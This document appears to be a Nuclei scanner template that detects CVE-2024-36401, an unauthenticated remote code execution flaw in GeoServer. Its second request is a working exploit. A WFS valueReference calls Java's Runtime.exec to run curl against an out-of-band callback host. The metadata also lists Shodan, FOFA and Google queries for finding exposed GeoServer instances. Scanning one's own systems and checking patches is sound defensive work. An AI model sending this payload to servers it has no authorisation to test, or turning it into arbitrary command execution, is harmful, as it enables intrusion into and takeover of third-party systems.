flow: 'if(http(1))

  {

  set("name",template.typename[0])

  http(2)

  }

  '
http:
- extractors:
  - group: 1
    internal: true
    name: typename
    part: body
    regex:
    - typeName=([^&\]]+)
    type: regex
  host-redirects: true
  raw:
  - 'GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage
    HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: content_type
    type: word
    words:
    - application/xml
  matchers-condition: and
  raw:
  - '@timeout 20s

    GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames={{name}}&valueReference=exec(java.lang.Runtime.getRuntime(),''curl+{{interactsh-url}}'')
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-36401
info:
  author: DhiyaneshDk,ryanborum
  classification:
    epss-percentile: 0.9998
    epss-score: 0.94425
  description: 'In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer,
    multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated
    users through specially crafted input against a default GeoServer installation
    due to unsafely evaluating property names as XPath expressions.

    '
  impact: 'This vulnerability can lead to executing arbitrary code.

    '
  metadata:
    fofa-query:
    - title="geoserver"
    - app="geoserver"
    google-query: intitle:"geoserver"
    max-request: 1
    product: geoserver
    shodan-query: 'Server: GeoHttpServer'
    vendor: osgeo
    verified: true
  name: GeoServer RCE in Evaluating Property Name Expressions
  reference:
  - https://x.com/sirifu4k1/status/1808270303275241607
  - https://nvd.nist.gov/vuln/detail/CVE-2024-36401
  - https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401
  - https://github.com/advisories/GHSA-6jj6-gm7p-fcvv
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2024,geoserver,rce,unauth,kev,vkev,vuln
